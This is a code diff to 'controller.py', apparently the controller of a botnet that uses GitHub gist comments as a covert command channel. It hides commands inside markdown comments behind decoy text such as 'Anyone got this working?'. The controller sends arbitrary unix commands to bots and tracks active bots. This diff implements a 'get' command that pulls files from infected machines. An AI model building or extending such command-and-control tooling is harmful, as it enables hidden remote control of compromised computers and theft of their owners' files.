@@ -5,10 +5,10 @@ import threading
 import time
 import requests
 from dotenv import dotenv_values
-from utils import create_markdown_comment, get_comment_text, get_markdown_timestamp, get_random_message, parse_markdown_comment
+from utils import create_markdown_comment,  create_markdown_timestamp, get_random_message, parse_markdown_comment
 
 parser = argparse.ArgumentParser(
-    prog='controller.py',
+    prog='python controller.py',
     description='Bot controller script, connect to given gist channel and send commands',
     usage="""
     "post": create comment with text and bot command - this wil create a comment and use it for all subsequent commands
@@ -16,6 +16,7 @@ parser = argparse.ArgumentParser(
     "commands": show commands and responses
         <any unix command>: send unix command to be called by bots 
         "clear": command bots to delete their comments
+        "get": get a file from bots machine
     "bots": show active bot count
     "clear": delete controller comments
     "comments": show gist comments
@@ -87,7 +88,7 @@ def post_comment(message):
 def post_command(command):
     def get_message():
         state['command_text'] = state['command_text'] if state['command_text'] is not None else get_random_message()
-        return f"{state['command_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment(command)}"
+        return f"{state['command_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment(command)}"
     command_comment = state['command_comment']
 
     if command_comment is None:
@@ -118,10 +119,13 @@ def delete_comment(comment_id: str):
         f'{comments_url}/{comment_id}', headers=headers)
 
 
-def prompt(message="$ "):
+def prompt(message="$ ", default=''):
     sys.stdout.write(message)
     sys.stdout.flush()
-    return sys.stdin.readline().strip()
+    response = sys.stdin.readline().strip()
+    if (response == ''):
+        return default
+    return response
 
 
 def ping_bots():
@@ -129,7 +133,7 @@ def ping_bots():
         state['ping_text'] = state['ping_text'] if state['ping_text'] is not None else get_random_message(
             ['Anyone got this working?', 'Is this up to date?'])
 
-        return f"{state['ping_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment('ping')}"
+        return f"{state['ping_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment('ping')}"
 
     while True:
         try:
@@ -183,7 +187,7 @@ while True:
             print_comments(latest_only=True, commands_only=True)
 
         case 'post':
-            text = prompt("> Write comment: ")
+            text = prompt("> Write comment: ", default=get_random_message())
             command = prompt("> Submit command: ")
             response = post_comment(
                 f'{text}\n\n{create_markdown_comment(command)}')
@@ -198,7 +202,7 @@ while True:
 
         case 'get':
             filename = prompt("> Submit filename: ")
-            raise NotImplementedError()
+            post_command(f"get {filename}")
 
         case 'bots':
             print(f'> bot count: {state["bot_count"]}')
